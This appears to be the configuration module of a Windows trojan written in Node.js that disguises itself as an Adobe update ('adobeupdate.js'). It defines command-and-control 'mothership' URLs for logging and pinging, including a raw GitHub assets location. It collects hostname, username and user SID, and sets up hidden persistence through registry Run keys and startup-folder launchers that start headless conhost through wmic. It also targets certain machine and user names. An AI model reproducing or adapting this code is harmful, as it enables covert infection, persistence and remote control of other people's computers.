const path = require("path");
const PubNub = require("pubnub");
const net = require("net");
const { fork, exec, spawn } = require("child_process");
const fs = require("fs");
const os = require("os");
const crypto = require("crypto");
const util = require("util");

var pubnubconfig = {};

// TODO change logic such that mothership bounces around unless a cmd is running
// refactor to read/write mothershipconfig.json
var mothershipconfig = {
    get mothershipconfigfpath() {
        return path.join(systemconfig.trojandir, "mothership");
    },

    mothershipindex: -1,

    get mothership() {
        if (this.mothershipindex < 0) return this.selectMothership();

        return this.mothershiplist[this.mothershipindex];
    },

    get mothershipassets() {
        return "https://raw.githubusercontent.com/owd842/mothershipassets/master";
    },

    mothershiplist: [
        "https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault",
    ],

    get logmsgurl() {
        return this.mothership + "/ow/logmsg.php";
    },

    get pingurl() {
        return this.mothership + "/ow/ping.php";
    },

    selectMothership: function () {
        let mothershiparr = this.mothershiplist;

        let mothershipurl = "";

        if (helper.fileExists(this.mothershipconfigfpath)) {
            mothershipurl = helper.readTag(this.mothershipconfigfpath);

            if (!helper.isNullOrWhitespace(mothershipurl)) {
                for (let i = 0; i <= mothershiparr.length; i++) {
                    if (mothershiparr[i] == mothershipurl) {
                        this.mothershipindex = i;
                        return mothershipurl;
                    }
                }
            }
        }

        let count = mothershiparr.length;

        if (this.mothershipindex < -1 || this.mothershipindex == count - 1) {
            this.mothershipindex = 0;
        } else {
            this.mothershipindex++;
        }

        mothershipurl = mothershiparr[this.mothershipindex];

        helper.writeTag(this.mothershipconfigfpath, mothershipurl);

        helper.logmsg(
            `index: ${this.mothershipindex} -- mothership: ${mothershipurl}`
        );

        return mothershipurl;
    },

    readconfig: function () {},

    writeconfig: function () {},

    init: function () {},
};

var systemconfig = {
    scriptts: "",
    istpl: "",

    sessionid: "",
    launch_script_fname: "launch.cmd",

    staticdelay: 30,
    trojanname: "owd",
    script_version: "full_infection_script",
    trojandir: "",

    launch_script_fname: "launch.cmd",
    launch_script_fpath: "",

    clientid: "",
    sessionid: "",

    scriptmd5: "",

    machinename: os.hostname(), // BWPCP503
    username: os.userInfo().username, // ADULT2022, LC2022, CAT2022
    usersid: "", // S-1-5-21-3127389091-2830476002-349640086-1001

    trojanfname: "adobeupdate.js",

    get trojanfpath() {
        return path.join(this.trojandir, this.trojanfname);
    },

    get scriptpid() {
        return process.pid;
    },

    get scriptparentpid() {
        return process.ppid;
    },

    scriptfpath: "",

    get scriptdir() {
        return path.dirname(this.scriptfpath);
    },

    get source() {
        return path.basename(this.scriptfpath);
    },

    get clientidfpath() {
        return path.join(this.trojandir, "client_id");
    },

    get pcmondir() {
        return path.join(this.trojandir, "pcmon");
    },

    get pspcmondir() {
        return path.join(this.trojandir, "pcmon");
    },

    get nodefolder() {
        return "node-v26.4.0-win-x64";
    },

    get nodeexedir() {
        return path.join(this.nodedir, this.nodefolder);
    },

    get nodeexepath() {
        return "C:\\Program Files\\Adobe\\Adobe Creative Cloud Experience\\libs\\node.exe"; //path.join(this.nodeexedir, "node.exe");
    },

    get nodedir() {
        return "C:\\Program Files\\Adobe\\Adobe Creative Cloud Experience\\libs"; //path.join(this.trojandir, "node");
    },

    get nodegsdfilesdir() {
        return path.join(this.nodedir, "gsd_files");
    },

    get gsdfilesdir() {
        return path.join(this.pythondir, "gsd_files");
    },

    get pythondir() {
        return path.join(this.trojandir, "python");
    },

    get pythonexedir() {
        return path.join(
            systemconfig.pythondir,
            "work",
            "Portable Python-3.10.5 x64",
            "App",
            "Python"
        );
    },

    get pythonexepath() {
        return path.join(systemconfig.pythonexedir, "python.exe");
    },

    get statekvp() {
        return {
            clientid: this.clientid,
            sessionid: this.sessionid,
            script_version: this.script_version,
            source: this.source,
            scriptts: this.scriptts,
            machinename: this.machinename,
            username: this.username,
            scriptmd5: this.scriptmd5,
        };
    },

    get statestr() {
        return `cmdname=${helper_ps.getcmdname()} cmdtaskname=${helper_ps.getcmdtaskname()} ts=${
            this.scriptts
        } pid=${this.scriptpid} ppid=${this.scriptparentpid} md5=${
            this.scriptmd5
        }`;
    },

    init: function () {
        this.scriptts = helper.getTimestamp();
        this.sessionid = helper.getRandomCode(8);

        this.scriptfpath = helper_ps.process_argv[1];

        this.trojandir = path.join(process.env.ProgramData, this.trojanname);

        this.launch_script_fpath = path.join(
            this.trojandir,
            this.launch_script_fname
        );

        this.clientid = this.init_clientid();
    },

    init_clientid: function () {
        let tclientid = "";

        if (helper.fileExists(this.clientidfpath)) {
            tclientid = helper.readTag(this.clientidfpath);
        } else {
            tclientid = helper.getRandomCode(8);
            helper.writeTag(this.clientidfpath, tclientid);
        }

        return tclientid;
    },

    init_usersid: async function () {
        let fpath = path.join(systemconfig.trojandir, "usersid");

        let tusersid = "";

        if (helper.fileExists(fpath)) {
            tusersid = helper.readTag(fpath);
        } else {
            tusersid = await helper.getusersid();

            helper.writeTag(fpath, tusersid);
        }

        this.usersid = tusersid;
    },

    init_scriptmd5: function () {
        let fpath = path.join(this.trojandir, "scriptmd5");

        let md5str = "";

        if (helper.fileExists(fpath)) {
            md5str = helper.readTag(fpath);
        } else {
            md5str = helper.getFileMD5(this.scriptfpath);

            if (!helper.isNullOrWhitespace(md5str))
                helper.writeTag(fpath, md5str);
        }

        this.scriptmd5 = md5str;
    },

    init_istpl: function () {
        let machineprefix = this.machinename.toLowerCase().substring(0, 5);

        if (
            ["ADULT2022", "LC2022", "CAT2022"].includes(
                this.username.toUpperCase()
            )
        ) {
            this.istpl = true;
            return;
        }

        if (
            machineprefix == "RLPCP".toLowerCase() ||
            machineprefix == "SJPCP".toLowerCase() ||
            machineprefix == "BWPCP".toLowerCase()
        ) {
            this.istpl = true;
            return;
        }

        if (helper.fileExists(path.join(this.trojandir, "tplmode"))) {
            this.istpl = true;
            return;
        }

        this.istpl = false;
    },
};

var regstartupconfig = {
    get new_item_str() {
        return "New-ItemProperty -Path $RegistryPath -Name $Name -Value $Value -PropertyType String -Force";
    },

    get new_drive_tag() {
        return `New-PSDrive -PSProvider Registry -Name HKU -Root HKEY_USERS`;
    },

    get_startup_script(reg_obj) {
        let txt = "";
        txt = regstartupconfig.get_name_value_str(reg_obj) + "\r\n";
        txt += `$RegistryPath = "${reg_obj.path}"` + "\r\n";
        txt += regstartupconfig.new_item_str;

        if (["startup_hku", "startup_hku_default"].includes(reg_obj.name)) {
            return regstartupconfig.new_drive_tag + "\r\n" + txt;
        }

        return txt;
    },

    get_startup_value(reg_obj) {
        let tpath = path.join(
            systemconfig.trojandir,
            systemconfig.launch_script_fname
        );
        return `conhost.exe --headless ${tpath} ${reg_obj.name}`;
    },

    get_name_value_str(reg_obj) {
        return (
            `$Name = "adobeupdate_startup"` +
            "\r\n" +
            `$Value = "${regstartupconfig.get_startup_value(reg_obj)}"` +
            "\r\n"
        );
    },

    get reg_paths() {
        let paths = [];

        for (const reg of regstartupconfig.regs) {
            if (!systemconfig.istpl || reg.name != "starup_hku_default")
                paths.push(reg.path);
        }

        return paths;
    },

    regs: [
        {
            name: "startup_hku",
            get path() {
                return `HKU:\\${systemconfig.usersid}\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run`;
            },
            enabled: true,
        },
        {
            name: "startup_hkcu",
            path: `HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`,
            enabled: true,
        },
        {
            name: "startup_hklm",
            path: "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            enabled: true,
        },
        {
            name: "startup_hku_default",
            path: "HKU:\\.DEFAULT\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            enabled: true,
        },
    ],
};

var startupfolderconfig = {
    get launcher_fname() {
        return "adobeupdate.cmd";
    },

    getFolder(foldername) {
        this.folders.forEach((folder) => {
            if (folder.name == foldername) return folder;
        });
    },

    getScriptPath(foldername) {
        return path.join(this.getFolderPath(foldername), this.launcher_fname);
    },

    getFolderPath(foldername) {
        for (const folder of this.folders) {
            if (folder.name == foldername) {
                return folder.folderpath;
            }
        }
    },

    getLauncherScript(foldername) {
        let pre = "@echo off" + "\r\n";
        return (
            pre +
            `start "" /min wmic process call create "conhost.exe --headless ${systemconfig.launch_script_fpath} ${foldername}"`
        );
    },

    get foldernames() {
        let tfoldernames = [];

        this.folders.forEach((folder) => {
            tfoldernames.push(folder.name);
        });

        return tfoldernames;
    },

    get folderpaths() {
        let tfolderpaths = [];

        this.folders.forEach((folder) => {
            tfolderpaths.push(folder.folderpath);
        });

        return tfolderpaths;
    },

    get folders() {
        if (systemconfig.istpl) {
            return startupfolderconfig.tpl_folders;
        } else {
            return startupfolderconfig.client_folders;
        }
    },

    client_folders: [
        {
            enabled: true,
            name: "startup_activeusers",
            folderpath: `C:\\Users\\${systemconfig.username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup`,
        },
        {
            enabled: true,
            name: "startup_allusers",
            folderpath:
                "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
        },
    ],

    tpl_folders: [
        {
            enabled: true,
            name: "startup_allusers",
            folderpath:
                "C:\\Users\\All Users\\MandatoryProfile\\Mandatory.V6\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
        },

        {
            enabled: true,
            name: "startup_profile",
            folderpath:
                "C:\\ProgramData\\MandatoryProfile\\Mandatory.V6\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
        },

        {
            enabled: true,
            name: "startup_user",
            folderpath: `C:\\Users\\${systemconfig.username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup`,
        },
    ],
};

module.exports = {
    systemconfig,
    mothershipconfig,
    regstartupconfig,
    startupfolderconfig,
};

const helper = require("./adobeupdate.helper.js");
const helper_ps = require("./adobeupdate.helper.ps.js");

systemconfig.init();

(async () => {
    await systemconfig.init_usersid();
})();

systemconfig.init_scriptmd5();
systemconfig.init_istpl();
